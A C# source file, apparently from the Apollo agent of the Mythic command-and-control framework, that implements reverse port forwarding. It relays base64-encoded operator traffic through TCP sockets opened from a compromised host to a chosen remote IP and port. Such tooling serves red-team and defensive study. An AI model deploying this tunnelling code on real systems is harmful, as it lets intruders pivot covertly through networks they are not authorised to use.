using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.RPortFwdProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;
using Apollo.SocksProxy.Enums;
using Apollo.SocksProxy.Structs;

namespace Apollo.RPortFwdProxy.Classes
{
    public class ProxyConnection
    {

        public string MythicPort;
        public string RemotePort;
        public string RemoteIp;

        public bool reconSignal = false;
        public int last_msg = 0;
        private object syncMapQueue = new Object();
	private object syncMapMsg = new Object();
	private object syncMapConn = new Object();
        //public Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>> messages_back = new Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>>();
        public Dictionary<string, Queue<String>> operatorMapQueue = new Dictionary<string, Queue<String>>();
        public Dictionary<string, Thread> operatorReadQueue = new Dictionary<string, Thread>();

        //public Dictionary<string, Object> queueLockerMsgBack = new Dictionary<string, Object>();
        //public Dictionary<string, Object> queueLocker = new Dictionary<string, Object>();
	public Dictionary<string, int> operatorState = new Dictionary<string, int>();
	public Dictionary<string, Socket> operatorMapConn = new Dictionary<string, Socket>();
        public Dictionary<String, Queue<String>> messages_back = new Dictionary<String, Queue<String>>();

        public static Thread operatorDispatchDatagram;

        private static Random rnd = new Random();

        private bool exited = false;

        public ProxyConnection(string port, string rport, string rip)
        {
            MythicPort = port;
            RemotePort = rport;
            RemoteIp = rip;

            operatorDispatchDatagram = new Thread(() => DispatchToOperators());
            operatorDispatchDatagram.Start();
        }

        public string GetConfs()
        {
            return "[+] Local Port: " + MythicPort + " - Remote Port: " + RemotePort + " - Remote IP: " + RemoteIp;
        }

        public void StopForward()
        {
	    List<string> operators = null;
            lock(syncMapConn){
		exited = true;
                operators = new List<string>(operatorMapConn.Keys);
	        foreach (string entry in operators)
                {
		    if (operatorMapConn[entry] != null){
                        try{
			    operatorMapConn[entry].Shutdown(SocketShutdown.Both);
		            operatorMapConn[entry].Close();
		        }catch{}
		        try{
		            operatorMapQueue[entry].Clear();
		        }catch{}
		    }
		}
            }
        }

        private void DispatchToOperators()
        {
            try{
                while (!exited)
                {
		    List<string> operators = new List<string>(operatorMapQueue.Keys);

		    while(operators.Count == 0){
                        operators = new List<string>(operatorMapQueue.Keys);

		    }
		    foreach (string entry in operators)
                    {
                        if (operatorMapConn.ContainsKey(entry) == false)
                        {
			    lock(syncMapConn){
		                operatorMapConn[entry] = null;
			        Socket new_operatorconn = null;
			        operatorMapConn[entry] = initConn();
			    }
			    if (operatorMapConn[entry] != null){
                                operatorState[entry] = 0;
      			        Thread thread = new Thread(() => ReadFromTarget(entry));
                                operatorReadQueue[entry] = thread;
		                operatorReadQueue[entry].Start();
			    }
			}
			while (operatorMapQueue[entry].Count > 0)
                        {
                            if (operatorMapConn[entry] != null){

			        string base64data = "";

				lock(syncMapQueue){
				    base64data = (string)operatorMapQueue[entry].Dequeue();
				}

			        byte[] data = Convert.FromBase64String(base64data);
                                try{
			            operatorMapConn[entry].Send(data);
				    operatorState[entry] = 1;
				}catch{

                                        //operatorMapConn[entry].Shutdown(SocketShutdown.Both);
				        //operatorMapConn[entry].Close();
				    lock(syncMapConn){
				        operatorMapConn[entry] = null;
				    }
				}
                            }
			}
                    }
                }
	    // keep reading from operatorMapQueue and send to operatorMapConn
            }catch{ }
        }

        public void AddDatagramToQueueProx(Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>> msgs)
        {
            try{//KeyValuePair<string, ProxyConnection> entry
                foreach (KeyValuePair<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>> rport_dict in msgs)
                {
                    foreach(KeyValuePair<String, Dictionary<String, Dictionary<int,String>>> rip_dict in rport_dict.Value)
                    {
                        foreach(KeyValuePair<String, Dictionary<int,String>> entry in rip_dict.Value)
                        {
                            if (!operatorMapQueue.ContainsKey(entry.Key))
                            {
                                operatorMapQueue[entry.Key] = new Queue<String>();
	                    }

                            string operatorId = entry.Key;
                            foreach(KeyValuePair<int, String> base64data in entry.Value)
                            {
			        lock(syncMapQueue){
				    operatorMapQueue[entry.Key].Enqueue(base64data.Value);
                                    if(base64data.Key == -1)
                                    {
                                        reconSignal = true;
                                        last_msg = 0;
                                    }
			        }
			    }
			}
		    }
		}
	    }catch{}
        }


        // TODO
        public Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>> GetMessagesBack()
        {
            Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>> temp_dict1 = new Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>>();
            try{
	        Dictionary<String, Dictionary<String, Dictionary<int,String>>> temp_dict3 = new Dictionary<String, Dictionary<String, Dictionary<int,String>>>();
                Dictionary<String, Dictionary<int, String>> temp_dict2 = new Dictionary<String, Dictionary<int,String>>();

	        List<string> operators = new List<string>(operatorMapConn.Keys);

	        foreach (string entry in operators)
                {
	            string operatorId = entry;
		    Dictionary<int,String> msgs = new Dictionary<int,String>();
	            if (messages_back.ContainsKey(entry)){
                        lock(syncMapMsg){
                            while(messages_back[entry].Count > 0)
		            {
				msgs[last_msg] = messages_back[entry].Dequeue();
                                last_msg = last_msg + 1;
		            }
			}
		        temp_dict2[operatorId] = msgs;
		    }
                }

                temp_dict3[RemoteIp] = temp_dict2;
                temp_dict1[RemotePort] = temp_dict3;
	    }catch {}
            return temp_dict1;
        }

        public void ReadFromTarget(string oper)
        {
            string oper_aux_str = oper;
	    while(operatorState[oper] == 0){
                Thread.Sleep(100);
	    }
            lock(syncMapMsg){
	        if (messages_back.ContainsKey(oper) == false)
                {
                    Queue<String> message_list = new Queue<String>();
                    messages_back[oper] = message_list;
                    last_msg = 0;
                }
	    }
	    while(exited == false){
		try{
	            byte[] data = new byte[8192];
		    int size_data = 0;

		    size_data = operatorMapConn[oper].Receive(data);
                    byte[] trimmed_data = data.Take(size_data).ToArray();
                    string data_Base64 = Convert.ToBase64String(trimmed_data);
		    if(data_Base64 != ""){
			lock(syncMapMsg){
                            if(reconSignal == true)
                            {
                                Queue<String> message_list_aux = new Queue<String>();
                                messages_back[oper] = message_list_aux;
                                int oper_aux = Int32.Parse(oper) + 1;
                                oper_aux_str = oper_aux.ToString();
                                reconSignal = false;
                            }
		            messages_back[oper_aux_str].Enqueue(data_Base64);
			}
		    }
		}catch(Exception ex){


			//operatorMapConn[oper].Shutdown(SocketShutdown.Both);
			//operatorMapConn[oper].Close();
                    operatorMapConn[oper] = null;
		    break;
		}
	    }
	}


        public Socket initConn()
        {
	    Socket socketOperator = null;
            try{
	    	IPEndPoint remoteEPC2 = new IPEndPoint(System.Net.IPAddress.Parse(RemoteIp), Convert.ToInt32(RemotePort));
                socketOperator = new Socket(System.Net.IPAddress.Parse(RemoteIp).AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                socketOperator.Connect(remoteEPC2);
	        return socketOperator;
	    }catch(Exception ex){
	        return socketOperator;
	    }
        }

    }
}
